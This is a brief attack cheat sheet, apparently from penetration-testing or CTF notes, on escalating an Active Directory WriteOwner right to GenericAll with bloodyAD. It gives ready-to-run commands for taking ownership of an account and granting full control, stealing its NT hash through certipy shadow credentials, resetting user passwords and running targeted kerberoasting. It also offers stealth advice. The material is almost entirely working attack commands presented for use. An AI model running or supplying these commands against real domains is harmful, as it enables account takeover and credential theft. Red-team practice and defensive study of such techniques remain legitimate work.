# WriteOwner → GenericAll Escalation

If BloodHound shows `WriteOwner` on an object (user, group, computer, service account), escalate to full control in two steps with `bloodyAD`:

```bash
# 1. Become owner of the target object
bloodyAD -d <domain> --host <DC_IP> -u <USER> -p '<PASS>' set owner <TARGET> <USER>

# 2. Grant yourself GenericAll (FullControl) on it
bloodyAD -d <domain> --host <DC_IP> -u <USER> -p '<PASS>' add genericAll <TARGET> <USER>
```

Now use GenericAll however the target allows:
```bash
# Service/computer account → shadow credentials (quieter than password reset)
certipy shadow auto -u <USER>@<domain> -p '<PASS>' -account '<TARGET>' -dc-ip <DC_IP>
# Returns: NT hash for <TARGET> — use for PTH or further enum

# Regular user → password reset
bloodyAD -d <domain> --host <DC_IP> -u <USER> -p '<PASS>' set password <TARGET> '<NEWPASS>'

# Service account → targeted kerberoast (if GenericWrite is enough)
targetedKerberoast.py -d <domain> -u <USER> -p '<PASS>' --request-user <TARGET> --dc-ip <DC_IP>
```

`certipy shadow auto` handles the full pywhisker → PKINIT → NT hash pipeline automatically; prefer it over the manual `pywhisker` + `gettgtpkinit` + `getnthash` chain.
